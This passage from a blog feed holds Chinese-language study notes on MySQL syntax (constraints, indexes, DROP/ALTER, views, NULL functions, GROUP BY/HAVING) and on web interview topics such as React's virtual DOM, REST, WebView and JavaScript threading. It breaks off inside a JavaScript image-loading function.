PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。
FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。
CHECK - 保证列中的值符合指定的条件。
DEFAULT - 规定没有给列赋值时的默认值。
</code></pre><p>(1) NOT NULL 约束<br>强制列不接受 NULL 值, 强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。<br>(2)  UNIQUE 约束<br>唯一标识数据库表中的每条记录。<br>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。<br>PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。<br>注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。<br>下面的 SQL 在 “Persons” 表创建时在 “<code>P_Id</code>“ 列上创建 UNIQUE 约束：</p>
<pre><code>CREATE TABLE Persons
(
P_Id int NOT NULL,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255),
UNIQUE (P_Id)
);
</code></pre><p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，使用下面的 SQL 语法：</p>
<pre><code>CREATE TABLE Persons
(
P_Id int NOT NULL,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255),
CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)
);
</code></pre><p><strong>当表已被创建时</strong>，如需在 “<code>P_Id</code>“ 列创建 UNIQUE 约束，使用下面的 SQL：</p>
<pre><code>ALTER TABLE Persons
ADD UNIQUE (P_Id);
</code></pre><p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，使用下面的 SQL 语法：</p>
<pre><code>ALTER TABLE Persons
ADD CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName);
</code></pre><p><strong>撤销 UNIQUE 约束:</strong></p>
<pre><code>ALTER TABLE Persons
DROP INDEX uc_PersonID
</code></pre><p>(3) PRIMARY KEY 约束<br>唯一标识数据库表中的每条记录。<br>主键必须包含唯一的值，主键列不能包含 NULL 值。<br>每个表都应该有一个主键，并且每个表只能有一个主键。<br>下面的 SQL 在 “Persons” 表创建时在 “<code>P_Id</code>“ 列上创建 PRIMARY KEY 约束：</p>
<pre><code>CREATE TABLE Persons
(
P_Id int NOT NULL,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255),
PRIMARY KEY (P_Id)
);
</code></pre><p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，使用下面的 SQL 语法：</p>
<pre><code>CREATE TABLE Persons
(
P_Id int NOT NULL,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255),
CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)
);
</code></pre><p>注释：在上面的实例中，只有一个主键 PRIMARY KEY（<code>pk_PersonID</code>）。然而，pk_PersonID 的值是由两个列（<code>P_Id</code> 和 <code>LastName</code>）组成的。<br><strong>当表已被创建时</strong>，如需在 “<code>P_Id</code>“ 列创建 PRIMARY KEY 约束，使用下面的 SQL：</p>
<pre><code>ALTER TABLE Persons
ADD PRIMARY KEY (P_Id);
</code></pre><p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，使用下面的 SQL 语法：</p>
<pre><code>ALTER TABLE Persons
ADD CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName);
</code></pre><p><strong>撤销 PRIMARY KEY 约束:</strong></p>
<pre><code>ALTER TABLE Persons
DROP PRIMARY KEY
</code></pre><p>撤销PRIMARY KEY约束时，不论约束条件为一列还是多列，对于MySQL，撤销都是如上的语句。<br>(4)  FOREIGN KEY 约束<br>一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY。<br>FOREIGN KEY 约束用于预防破坏表之间连接的行为。<br>FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。<a href="http://www.runoob.com/sql/sql-foreignkey.html" target="_blank" rel="noopener">参考菜鸟教程</a>。<br>(5) CHECK 约束<br>用于限制列中的值的范围。<br>如果对单个列定义 CHECK 约束，那么该列只允许特定的值。<br>如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。<a href="http://www.runoob.com/sql/sql-check.html" target="_blank" rel="noopener">参考菜鸟教程</a>。<br>(6) DEFAULT 约束<br>用于向列中插入默认值。如果没有规定其他的值，那么会将默认值添加到所有的新记录。<br>下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束：</p>
<pre><code>CREATE TABLE Persons
(
P_Id int NOT NULL,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255) DEFAULT &apos;Sandnes&apos;
);
</code></pre><p>通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值：</p>
<pre><code>CREATE TABLE Orders
(
O_Id int NOT NULL,
OrderNo int NOT NULL,
P_Id int,
OrderDate date DEFAULT GETDATE()
);
</code></pre><p>当表已被创建时，如需在 “City” 列创建 DEFAULT 约束，使用下面的 SQL:</p>
<pre><code>ALTER TABLE Persons
ALTER City SET DEFAULT &apos;SANDNES&apos;;
</code></pre><p>撤销 DEFAULT 约束:</p>
<pre><code>ALTER TABLE Persons
ALTER City DROP DEFAULT;
</code></pre><h3 id="28-CREATE-INDEX"><a href="#28-CREATE-INDEX" class="headerlink" title="28.CREATE INDEX"></a>28.CREATE INDEX</h3><p>用于在表中创建索引。在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。<br>用户无法看到索引，它们只能被用来加速搜索/查询。<br><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。<br>在表上创建一个简单的索引。允许使用重复的值：</p>
<pre><code>CREATE INDEX index_name
ON table_name (column_name1, column_name2);
</code></pre><p>在表上创建一个唯一的索引。不允许使用重复的值(唯一的索引意味着两个行不能拥有相同的索引值)：</p>
<pre><code>CREATE UNIQUE INDEX index_name
ON table_name (column_name);
</code></pre><h3 id="29-DROP"><a href="#29-DROP" class="headerlink" title="29.DROP"></a>29.DROP</h3><p>使用 DROP 语句，可以轻松地删除索引、表和数据库。<br>DROP INDEX 语句用于删除表中的索引。MySQL 的 DROP INDEX 语法：<code>ALTER TABLE table_name DROP INDEX index_name;</code></p>
<p>DROP TABLE 语句用于删除表: <code>DROP TABLE table_name;</code></p>
<p>DROP DATABASE 语句用于删除数据库: <code>DROP DATABASE database_name;</code></p>
<p>仅仅删除表内的数据，但并不删除表本身时： <code>TRUNCATE TABLE table_name;</code></p>
<h3 id="30-ALTER"><a href="#30-ALTER" class="headerlink" title="30.ALTER"></a>30.ALTER</h3><p>ALTER TABLE 语句用于在已有的表中添加、删除或修改列。<br><strong>在表中添加列:</strong></p>
<pre><code>ALTER TABLE table_name
ADD column_name datatype;
</code></pre><p><strong>删除表中的列:</strong></p>
<pre><code>ALTER TABLE table_name
DROP COLUMN column_name;
</code></pre><p><strong>改变表中列的数据类型:</strong></p>
<pre><code>ALTER TABLE table_name
MODIFY COLUMN column_name datatype;
</code></pre><h3 id="31-AUTO-INCREMENT"><a href="#31-AUTO-INCREMENT" class="headerlink" title="31.AUTO INCREMENT"></a>31.AUTO INCREMENT</h3><p><code>AUTO_INCREMENT</code> 会在新记录插入表中时生成一个唯一的数字。可用于在每次插入新记录时，自动地创建主键字段的值。<br>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 <code>AUTO_INCREMENT</code> 主键字段：</p>
<pre><code>CREATE TABLE Persons
(
ID int NOT NULL AUTO_INCREMENT,
LastName varchar(255) NOT NULL,
FirstName varchar(255),
Address varchar(255),
City varchar(255),
PRIMARY KEY (ID)
);
</code></pre><p>默认地，<code>AUTO_INCREMENT</code> 的开始值是 1，每条新记录递增 1。<br>要让 <code>AUTO_INCREMENT</code> 序列以其他的值起始，请使用下面的 SQL 语法： <code>ALTER TABLE Persons AUTO_INCREMENT=100;</code><br>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<pre><code>INSERT INTO Persons (FirstName,LastName)
VALUES (&apos;Lars&apos;,&apos;Monsen&apos;);
</code></pre><h3 id="32-视图（Views）"><a href="#32-视图（Views）" class="headerlink" title="32.视图（Views）"></a>32.视图（Views）</h3><p>视图是基于 SQL 语句的结果集的可视化的表。<br>视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。<br>可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，也可以呈现数据，就像这些数据来自于某个单一的表一样。<br>CREATE VIEW 语法:</p>
<pre><code>CREATE VIEW view_name AS
SELECT column_name(s)
FROM table_name
WHERE condition;
</code></pre><p>注释：视图总是显示最新的数据！每当用户查询视图时，数据库引擎通过使用视图的 SQL 语句重建数据。</p>
<h3 id="33-日期（Dates）"><a href="#33-日期（Dates）" class="headerlink" title="33.日期（Dates）"></a>33.日期（Dates）</h3><p>确保所插入的日期的格式，与数据库中日期列的格式相匹配。<a href="http://www.runoob.com/sql/sql-dates.html" target="_blank" rel="noopener">MySQL Date 函数</a>。</p>
<h3 id="34-NULL-值"><a href="#34-NULL-值" class="headerlink" title="34.NULL 值"></a>34.NULL 值</h3><p>如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以 NULL 值保存。<br>NULL 值的处理方式与其他值不同。<br>NULL 用作未知的或不适用的值的占位符。<br>无法使用比较运算符来测试 NULL 值，比如<code>=、&lt; 或 &lt;&gt;</code>。必须使用 IS NULL 和 IS NOT NULL 操作符。</p>
<pre><code>SELECT LastName,FirstName,Address FROM Persons
WHERE Address IS NULL;
</code></pre><h3 id="35-NULL-函数"><a href="#35-NULL-函数" class="headerlink" title="35.NULL 函数"></a>35.NULL 函数</h3><p>可以使用 IFNULL() 函数</p>
<pre><code>SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0))
FROM Products;
</code></pre><p>或者：</p>
<pre><code>SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0))
FROM Products;
</code></pre><p>示例：</p>
<pre><code>//如果alexa列为null值，则赋予0，否则，取原值
select id,name,url,ifnull(alexa,0)from websites;
select id,name,url,COALESCE(alexa,0) from websites;
</code></pre><h3 id="36-数据类型"><a href="#36-数据类型" class="headerlink" title="36.数据类型"></a>36.数据类型</h3><p>数据类型定义列中存放的值的种类。<a href="http://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">SQL 通用数据类型</a>。</p>
<h3 id="37-SQL-函数"><a href="#37-SQL-函数" class="headerlink" title="37.SQL 函数"></a>37.SQL 函数</h3><p>(1) SQL Aggregate 函数<br>SQL Aggregate 函数计算从列中取得的值，返回一个单一的值。常用的如下：</p>
<pre><code>AVG() - 返回平均值            SELECT AVG(column_name) FROM table_name;
COUNT() - 返回行数            SELECT COUNT(column_name) FROM table_name;
FIRST() - 返回第一个记录的值   //只有 MS Access 支持 FIRST() 函数。 MySQL语法实现此函数如：SELECT name AS FirstSite FROM Websites LIMIT 1; 
LAST() - 返回最后一个记录的值   //只有 MS Access 支持 LAST() 函数。
MAX() - 返回最大值            SELECT MAX(column_name) FROM table_name;
MIN() - 返回最小值
SUM() - 返回总和
</code></pre><p>(2) SQL Scalar 函数<br>SQL Scalar 函数基于输入值，返回一个单一的值。常用的如下：</p>
<pre><code>UCASE() - 将某个字段转换为大写                     SELECT UCASE(column_name) FROM table_name;
LCASE() - 将某个字段转换为小写
MID() - 从某个文本字段提取字符，MySql 中使用        SELECT MID(column_name,start[,length]) FROM table_name;
SubString(字段，1，end) - 从某个文本字段提取字符
LEN() - 返回某个文本字段的长度                     //MySQL中使用方法： SELECT LENGTH(column_name) FROM table_name;
ROUND() - 对某个数值字段进行指定小数位数的四舍五入   SELECT ROUND(column_name,decimals) FROM table_name;
NOW() - 返回当前的系统日期和时间                   SELECT NOW() FROM table_name;
FORMAT() - 格式化某个字段的显示方式                SELECT FORMAT(column_name,format) FROM table_name;
</code></pre><p>(3) <strong>GROUP BY 语句</strong><br>用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<pre><code>SELECT column_name, aggregate_function(column_name)
FROM table_name
WHERE column_name operator value
GROUP BY column_name; 
</code></pre><p>如下统计 <code>access_log</code> 各个 <code>site_id</code> 的访问量：</p>
<pre><code>mysql&gt; SELECT site_id,SUM(access_log.count)
    -&gt; FROM access_log
    -&gt; GROUP BY site_id;
+---------+-----------------------+
| site_id | SUM(access_log.count) |
+---------+-----------------------+
|       1 |                   275 |
|       2 |                    10 |
|       3 |                   521 |
|       4 |                    13 |
|       5 |                   750 |
+---------+-----------------------+
</code></pre><p>GROUP BY 多表连接时，以下语句统计所有网站的访问的记录数：</p>
<pre><code>mysql&gt; SELECT Websites.name,COUNT(access_log.aid) AS nums FROM access_log
    -&gt; LEFT JOIN Websites
    -&gt; ON access_log.site_id=Websites.id
    -&gt; GROUP BY Websites.name;
+--------------+------+
| name         | nums |
+--------------+------+
| Facebook     |    2 |
| Google       |    2 |
| 微博         |    1 |
| 淘宝         |    1 |
| 菜鸟教程     |    3 |
+--------------+------+
</code></pre><p>以上示例中，<code>access_log</code>作为左表，<code>Websites</code>作为右表，通过 GROUP BY 对 COUNT得到的结果按<code>site_id</code>分组。</p>
<p>(4) <strong>HAVING 子句</strong><br>增加 HAVING 子句原因是，WHERE 关键字无法与聚合函数一起使用。<br>HAVING 子句可以让我们筛选分组后的各组数据。语法如下：</p>
<pre><code>SELECT column_name, aggregate_function(column_name)
FROM table_name
WHERE column_name operator value
GROUP BY column_name
HAVING aggregate_function(column_name) operator value; 
</code></pre><p>以下语句用于查找总访问量大于 200 的网站：</p>
<pre><code>mysql&gt; SELECT Websites.name,Websites.url,SUM(access_log.count) AS nums FROM access_log
    -&gt; INNER JOIN Websites
    -&gt; ON access_log.site_id=Websites.id
    -&gt; GROUP BY Websites.name
    -&gt; HAVING SUM(access_log.count) &gt; 200;
+--------------+--------------------------+------+
| name         | url                      | nums |
+--------------+--------------------------+------+
| Facebook     | http://www.facebook.com/ |  750 |
| Google       | https://www.google.com/  |  275 |
| 菜鸟教程     | http://www.runoob.com    |  521 |
+--------------+--------------------------+------+
</code></pre><p>以下语句用于查找总访问量大于 200 的网站，并且 alexa 排名小于 200：</p>
<pre><code>mysql&gt; SELECT Websites.name,Websites.alexa,SUM(access_log.count) AS nums FROM access_log
    -&gt; INNER JOIN Websites
    -&gt; ON Websites.id=access_log.site_id
    -&gt; WHERE Websites.alexa &lt; 200
    -&gt; GROUP BY Websites.name
    -&gt; HAVING SUM(access_log.count) &gt; 200;
+----------+-------+------+
| name     | alexa | nums |
+----------+-------+------+
| Facebook |     3 |  750 |
| Google   |     1 |  275 |
+----------+-------+------+
</code></pre><p>具体的使用方法参见<a href="http://www.runoob.com/sql/sql-function.html" target="_blank" rel="noopener">菜鸟教程SQL 函数</a>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于MySQL数据库基本的安装和操作方法。&lt;a href=&quot;http://www.runoob.com/mysql/mysql-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MySQL教程–菜鸟&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="MySQL" scheme="http://yoursite.com/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>【interview questions about Web】</title>
    <link href="http://yoursite.com/2018/03/04/interview-questions-about-Web/"/>
    <id>http://yoursite.com/2018/03/04/interview-questions-about-Web/</id>
    <published>2018-03-04T07:20:40.000Z</published>
    <updated>2018-05-29T02:40:43.615Z</updated>
    
    <content type="html"><![CDATA[<p>Web方面的知识盲区补漏。<br><a id="more"></a></p>
<h3 id="匹配URL的正则表达式"><a href="#匹配URL的正则表达式" class="headerlink" title="匹配URL的正则表达式"></a>匹配URL的正则表达式</h3><p>URL由三部分组成：资源类型(协议)、存放资源的主机域名、资源文件名。<br>URL的一般语法格式为(带方括号[ ]的为可选项)：<br><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code><br>据说比较好用匹配较全面的是这个：<br><code>(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]</code><br>参考自博客<a href="https://www.cnblogs.com/speeding/p/5097790.html" target="_blank" rel="noopener">正确匹配URL的正则表达式</a>、<a href="http://blog.csdn.net/t_1007/article/details/52293475" target="_blank" rel="noopener">匹配URL的正则表达式解析</a>。</p>
<h3 id="React虚拟DOM的优势，为什么虚拟DOM操作比原生方式快"><a href="#React虚拟DOM的优势，为什么虚拟DOM操作比原生方式快" class="headerlink" title="React虚拟DOM的优势，为什么虚拟DOM操作比原生方式快"></a>React虚拟DOM的优势，为什么虚拟DOM操作比原生方式快</h3><p>将数据的变化实时反映到UI上，这时需要对DOM进行操作，但复杂或频繁的DOM操作(会造成重排、重绘)通常是性能瓶颈产生的原因，为此，React引入了虚拟DOM（Virtual DOM）的机制。</p>
<p><strong>虚拟DOM?</strong><br> 在React中，render执行的结果得到的并不是真正的DOM节点，结果仅仅是轻量级的JavaScript对象，称之为virtual DOM。(是不是跟文档片段有异曲同工之妙？<a href="https://www.cnblogs.com/sdfcbs/p/6438784.html" target="_blank" rel="noopener">dom中的文档碎片</a>)</p>
<p>虚拟DOM是React的一大亮点，具有batching(批处理)和高效的Diff算法 (<a href="http://www.infoq.com/cn/articles/react-dom-diff/#" target="_blank" rel="noopener">深入浅出React（四）：虚拟DOM Diff算法解析</a>)。这让我们可以无需担心性能问题而”毫无顾忌”的随时“刷新”整个页面，由虚拟 DOM来确保只对界面上真正变化的部分进行实际的DOM操作。</p>
<p><strong>虚拟DOM对比原生操作DOM</strong><br>原生操作DOM方式，使用 innerHTML。在一个大型列表所有数据都变了的情况下，还算是合理，但当只有一行数据发生变化时，它也需要重置整个 innerHTML，这时候显然就造成了大量浪费。<br>innerHTML: render html string + 重新创建所有 DOM 元素<br>Virtual DOM: render Virtual DOM + diff + 必要的 DOM 更新<br>和 DOM 操作比起来，js 计算是非常便宜的。Virtual DOM render + diff 显然比渲染 html 字符串要慢，但是，它依然是纯 js 层面的计算，比起后面的 DOM 操作来说，依然便宜了太多。</p>
<p><strong>存疑</strong><br>React虚拟DOM的工作机制还不太理解，深入学习以后需要再回顾。<br><a href="https://www.cnblogs.com/chris-oil/p/6160985.html" target="_blank" rel="noopener">React虚拟DOM浅析</a><br><a href="https://segmentfault.com/a/1190000000606216" target="_blank" rel="noopener">React 的 diff 算法</a><br><a href="https://segmentfault.com/q/1010000000762295" target="_blank" rel="noopener">为什么 React 的 virtual DOM 比原生的DOM 渲染性能更好？</a></p>
<h3 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h3><p>REST(Representational State Transfer)，“表述性状态转移”，是一种网络应用架构规范，目标是构建可扩展的web service。<br>REST规范可以提高架构的性能和可维护性。REST是一种更简单的<a href="https://www.cnblogs.com/leijiangtao/p/5137351.html" target="_blank" rel="noopener">SOAP协议</a>及以<a href="http://blog.csdn.net/liguocai2005/article/details/4402350" target="_blank" rel="noopener">WSDL</a>为基础的web service的替代。(SOAP暴露接口，REST暴露资源)<br>参考博客<a href="http://blog.csdn.net/zl834205311/article/details/62231545?ABstrategy=codes_snippets_optimize_v3" target="_blank" rel="noopener">WebService两种发布协议–SOAP和REST的区别</a>。<br><a href="https://blog.igevin.info/posts/restful-architecture-in-general/" target="_blank" rel="noopener">RESTful</a>（采用REST架构规范的）系统通常是通过HTTP协议，并且使用HTTP的GET,POST,PUT,DELETE等动词来收发数据。<br>W3C TAG开发了REST架构，基于HTTP 1.0。万维网代表了最大的REST架构实现，你可以认为所有的网页服务器都是采用REST架构的RESTful系统。<br>目前在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的web服务开始采用REST风格设计和实现。<br><a href="https://www.cnblogs.com/bluewhale84/p/4443353.html" target="_blank" rel="noopener">常见的三种Web服务架构</a>。</p>
<h3 id="WebView相关"><a href="#WebView相关" class="headerlink" title="WebView相关"></a>WebView相关</h3><p><a href="https://www.cnblogs.com/dailc/p/5930231.html" target="_blank" rel="noopener">先了解什么是Hybrid APP</a>。所谓Hybrid,即混合开发,意味着半原生半Web,其实在H5兴盛之前,Hybrid模式就已经比较成熟了,但是一直不愠不火(因为系统的一些现在以及html本身功能的限制)。<br>怎么样的开发模式才算是Hybrid模式呢：</p>
<ul>
<li>Hybrid是半Native半web开发模式<br>Hybrid模式中,底层功能API均由原生容器通过某种方式提供,然后业务逻辑由H5页面完成,最终原生容器加载H5页面,完成整个App</li>
<li>成熟的Hybrid模式意味着业务逻辑均由H5实现<br>一款成熟的Hybrid框架,意味着各种类型的api都很完善,那么这时候几乎所有与业务相关的逻辑都是放在H5页面中的,原生只作为容器存在</li>
<li>成熟的Hybrid模式可复用性非常高,可以跨平台开发<br>成熟的Hybrid框架,那么原生只会提供底层API,也就是说所有的业务是H5完成,不管是什么项目,业务只由H5实现,这时候就可以发现,业务代码是可以跨平台的,也就是说,开发一次,就可以和各自原生容器结合,组成两种原生安装包了,达到了跨平台开发效果</li>
</ul>
<p><a href="http://blog.csdn.net/qibanxuehua/article/details/69944087?locationNum=12&amp;fps=1" target="_blank" rel="noopener">APP三种开发模式–之–HybridApp解决方案</a></p>
<p>原生APP开发中有一个webview的组件(Android中是webview,iOS7以下有UIWebview,7以上有WKWebview),这个组件可以加载Html文件。<br>在Html5没有兴盛之前,加载的Html往往只能用来做一些简单的静态资源显示,但是H5大行其道以后,Html5中有很多新增的功能,炫酷的效果,特别是iOS中H5支持一直都很良好,Android 4.4以上支持也足够,所以这时候发现可以将一些主要的逻辑都用H5页面来编写,然后原生直接用webview加载显示,这样大大提高了开发效率,而且体验也很不错。<br>webview用来展示网页的view组件，该组件是你运行自己的浏览器或者在你的线程中展示线上内容的基础。使用webkit渲染引擎来展示，并且支持前进后退等基于浏览历史，放大缩小，等更多功能。<br>简单来说WebView是手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装的一个组件。不给过没有提供地址栏和导航栏，只是单纯的展示一个网页界面。<br>参考文章<a href="https://www.cnblogs.com/pqjwyn/p/7120342.html" target="_blank" rel="noopener">前端解读Webview</a>、<a href="https://www.jianshu.com/p/8bd6aeb719ff" target="_blank" rel="noopener">WebView JavascriptBridge机制解析</a>、<a href="http://blog.csdn.net/rookie_small/article/details/68488335" target="_blank" rel="noopener">JS交互与WebView的工作原理浅析</a>。</p>
<h3 id="软件开发模式之“快速迭代”开发"><a href="#软件开发模式之“快速迭代”开发" class="headerlink" title="软件开发模式之“快速迭代”开发"></a>软件开发模式之“快速迭代”开发</h3><p>几种常见的软件开发模式对比参考博客<a href="https://www.cnblogs.com/tianguook/p/4004726.html" target="_blank" rel="noopener">软件开发模式对比(瀑布、迭代、螺旋、敏捷)</a>。<br>迭代成本比较低，一般采用敏捷开发的模式，产品快速的推动上线，上线后会通过用户反馈和用户行为分析不断的进行产品改进，并且每次改进的周期比较短，如果把“快速迭代”理解为快速并持续的更新和改进产品。</p>
<p><a href="http://blog.csdn.net/xiaoxian8023/article/details/8883791" target="_blank" rel="noopener">敏捷开发-快速迭代</a></p>
<h3 id="线程和进程的区别"><a href="#线程和进程的区别" class="headerlink" title="线程和进程的区别"></a>线程和进程的区别</h3><p><a href="https://www.zhihu.com/question/25532384" target="_blank" rel="noopener">线程和进程的区别是什么？–知乎</a><br>进程和线程都是一个时间段的描述，是CPU工作时间段的描述，不过是颗粒大小不同。<br>进程就是包换上下文切换的程序执行时间总和 = CPU加载上下文+CPU执行+CPU保存上下文。<br>线程是共享了进程的上下文环境的更为细小的CPU时间段。<br><a href="https://www.cnblogs.com/lgk8023/p/6430592.html" target="_blank" rel="noopener">进程和线程的区别</a><br><a href="http://www.ruanyifeng.com/blog/2013/04/processes_and_threads.html" target="_blank" rel="noopener">进程与线程的一个简单解释–阮一峰</a></p>
<p><strong><a href="http://blog.csdn.net/w2765006513/article/details/53743051" target="_blank" rel="noopener">浅谈js运行机制(线程）</a></strong><br>js运作在浏览器中,是单线程的，即js代码始终在一个线程上执行，这个线程称为js引擎线程。<br>浏览器是多线程的，除了js引擎线程，它还有：</p>
<pre><code> UI渲染线程
浏览器事件触发线程
http请求线程
EventLoop轮询的处理线程
....
</code></pre><p>单线程的含义是js只能在一个线程上运行，也就说，js同时只能执行一个js任务，其它的任务则会排队等待执行。<br>js是单线程的,并不代表js引擎线程只有一个。js引擎有多个线程，一个主线程，其它的后台配合主线程。<br>多线程之间会共享运行资源，浏览器端的js会操作dom，多个线程必然会带来同步的问题，所有js核心选择了单线程来避免处理这个麻烦。js可以操作dom，影响渲染，所以js引擎线程和UI线程是互斥的。这也就解释了js执行时会阻塞页面的渲染。</p>
<p><strong><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈Event Loop–阮一峰</a></strong><br><strong><a href="http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html" target="_blank" rel="noopener">Javascript异步编程的4种方法–阮一峰</a></strong><br><strong><a href="https://www.cnblogs.com/nidaye/p/4604147.html" target="_blank" rel="noopener">关于javascript的单线程和异步的一些问题</a></strong><br><a href="https://www.cnblogs.com/chris-oil/p/5339305.html" target="_blank" rel="noopener">Node.js的线程和进程</a></p>
<h3 id="图片加载完成之前获取图片高度"><a href="#图片加载完成之前获取图片高度" class="headerlink" title="图片加载完成之前获取图片高度"></a>图片加载完成之前获取图片高度</h3><p><strong><a href="http://www.css88.com/archives/5224" target="_blank" rel="noopener">JS快速获取图片宽高的方法</a></strong></p>
<p>参考自博客<a href="https://www.cnblogs.com/ztoz/p/5930277.html" target="_blank" rel="noopener">图片加载完成之前获取图片高度</a>。</p>
<p>原理：利用的就是浏览器加载图片时的一个策略：当图片头部信息加载完成后，浏览器即获知了图片的大小，然后就会在页面上空出相应的区域来，然后再下载图片的剩余数据并且显示到之前空出的区域中。<br>所以我们要做的就是不断的去问浏览器你得到高度信息了没有，问到之后就可以马上做相应的处理，而此时图片还没有下载完成。</p>
<p><strong>补充：</strong><a href="http://www.jb51.net/article/26264.htm" target="_blank" rel="noopener">js图片img的onload事件与complete属性之间的关系</a>,onload是图片加载完成执行的事件，complete属性是图片显示出来以后为true，那么在onload之前complete肯定是false的，那么我们就可以在onload事件内部判断complete属性是否为true。如果为true那么代表图片真正的加载成功，否则可以重新加载。</p>
<p>img加载完成就会触发onload事件，src是异步加载图片的，如果在绑定事件前就已经加载完成，onload事件不会触发。img.complete是一直都有的属性，加载完成后为true。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> imgReady = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">           <span class="keyword">var</span> list = [],</div><div class="line">               intervalId = <span class="literal">null</span>,</div><div class="line"></div><div class="line">               <span class="comment">// 用来执行队列    </span></div><div class="line">               tick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                   <span class="keyword">var</span> i = <span class="number">0</span>;</div><div class="line">                   <span class="keyword">for</span> (; i &lt; list.length; i++) &#123;</div><div class="line">                       list[i].end ? list.splice(i--, <span class="number">1</span>) : list[i]();</div><div class="line">                   &#125;;</div><div class="line">                   !list.length &amp;&amp; stop();</div><div class="line">               &#125;,</div><div class="line"></div><div class="line">               <span class="comment">// 停止所有定时器队列    </span></div><div class="line">               stop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                   clearInterval(intervalId);</div><div class="line">                   intervalId = <span class="literal">null</span>;</div><div class="line">               &#125;;</div><div class="line"></div><div class="line">           <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">url, ready, load, error</span>) </span>&#123;</div><div class="line">               <span class="keyword">var</span> onready, width, height, newWidth, newHeight,</div><div class="line">                   img = <span class="keyword">new</span> Image();</div><div class="line"></div><div class="line">               img.src 